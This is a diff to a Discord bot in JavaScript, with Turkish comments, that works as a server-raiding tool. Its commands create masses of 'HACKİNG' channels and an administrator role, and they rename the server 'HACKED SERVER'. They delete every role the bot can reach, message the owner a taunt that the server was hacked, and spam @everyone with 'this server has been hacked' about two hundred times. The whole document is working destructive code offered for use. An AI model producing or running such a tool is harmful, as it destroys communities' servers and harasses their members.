@@ -1454,9 +11606,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1470,9 +11619,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1486,9 +11632,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1502,9 +11645,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1518,9 +11658,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1534,9 +11671,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1550,9 +11684,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1566,9 +11697,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1582,9 +11710,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1598,9 +11723,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1614,9 +11736,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1630,9 +11749,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1646,9 +11762,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1662,9 +11775,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1678,9 +11788,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1694,9 +11801,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1710,9 +11814,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1726,9 +11827,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1742,9 +11840,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1758,9 +11853,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1774,9 +11866,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1790,9 +11879,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1806,9 +11892,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1822,9 +11905,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1838,9 +11918,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1854,9 +11931,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1870,9 +11944,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1886,9 +11957,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1902,9 +11970,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1918,9 +11983,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1934,9 +11996,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1950,9 +12009,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1966,9 +12022,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1982,9 +12035,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -1998,9 +12048,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -2014,9 +12061,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -2030,9 +12074,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -2046,9 +12087,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -2062,9 +12100,6 @@ client.on("message", async msg => {
         type: "voice"
       })
       .then(chan => {
-        chan.setUserLimit("112351474621672476124167212127312416276127456212");
-      });
-     (chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
     await msg.guild.createChannel("HACKİNG", {
@@ -2080,14 +12115,7 @@ client.on("message", async msg => {
       .then(chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
-    
-    await msg.guild.setIcon("https://i.hizliresim.com/MpAB0o.jpg");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
-    await msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
-    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
-    await client.user.setAvatar("https://i.hizliresim.com/MpAB0o.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
-    await client.user.setUsername("ャ HACKED ャ");    //BOTUN ISMİNİ DEGISTIRIR
-    await msg.guild.owner.send("**Sunucunu Hackledik Ağla :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
-    
+  
   }   
 });
 
@@ -3798,11 +13826,3708 @@ client.on("message", async msg => {
       color: "FF0032",
       permissions: ["ADMINISTRATOR"]
     });
+     msg.guild.setIcon("");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
+     msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
+     msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
+     client.user.setAvatar(""); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
+     client.user.setUsername("ャ HACKED ャ");    //BOTUN ISMİNİ DEGISTIRIR
+     msg.guild.owner.send("**Sunucunu Hackledik Ağla :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
+    
   }
 });
 
 client.on('message', msg => {
-  if (msg.content === '+spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
+  if (msg.content === '.boom1') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
